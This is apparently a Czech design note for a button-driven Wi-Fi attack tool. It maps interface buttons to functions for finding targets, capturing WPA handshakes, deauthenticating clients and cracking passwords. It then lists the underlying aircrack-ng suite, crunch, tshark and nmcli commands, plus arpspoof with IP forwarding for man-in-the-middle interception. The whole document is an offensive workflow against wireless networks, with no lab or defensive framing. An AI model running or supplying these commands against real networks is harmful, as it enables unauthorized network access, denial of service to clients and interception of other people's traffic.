# T1 - Vyhledání cílů

## Hledání Wifi rozhraní
| Tlačítko              | Funkce               |
| ----------------------|----------------------|
| Najdi Wi-fi rozhraní  | find_wifi_interfaces |


## Přepnutí rozhraní do monitorovacího módu
| Tlačítko                  | Funkce                |
| ----------------------    |-------------------    |
| Spusit monitorovací mód   | start_monitor_mode    |
| Zastavit monitorovací mód | stop_monitor_mode     |

## Záchyt komunikace v okolí

| Tlačítko          | Funkce                |
| ------------------|-------------------    |
| Spusit airmon-ng  | start_airodump_full   |
| Zastavit airmon-ng| stop_airodump_full    |


---
# T2 - Záchyt handshaku

## Záchyt handshaku
| Tlačítko          | Funkce                |
| ------------------|-------------------    |
| Spustit           | start_airodump_target |
| Zastavit          | stop_airodump_target  |

## Deauthenifikace cílového klienta
| Tlačítko          | Funkce                    |
| ------------------|-------------------        |
| Spustit           | start_deauthentification  |
| Zastavit          | stop_deauthentification   |

# T3 - Prolomení hesla

| Tlačítko              | Funkce                |
| ------------------    |-------------------    |
| Vytvořit              | create_wordlist       |
| Načíst                | openfile              |
| Prolomit heslo        | crack_password        |
| Připojit se k síti    | connect_to_network    |


======
iwconfig
ifconfig *interface* down
ifconfig *interface* up
service NetworkManager restart

airmon-ng check kill
airmon-ng start *interface*
airmon-ng stop *interface*

airmon-ng *interface* -w *output_file* --output-format csv
airodump -c*channel* -d *AP* -w *output_file* *interface*

aireplay-ng --deauth 0 -D -c *CLIENT* -a *AP* *interface*

tshark -r *input_file* -n -Y "eapol"

crunch *min* *max* *chars* -o *output_file*
aircrack-ng *input_file* -W *wordlist* -l *output_password*

nmcli wifi connect *net_name* password *password* ifname *interface*
===
sysctl net.ipv4.ip_forward=1
arpspoof -i *interface* -t *CLIENT* *AP*
arpspoof -i *interface* -t *AP* *CLIENT*

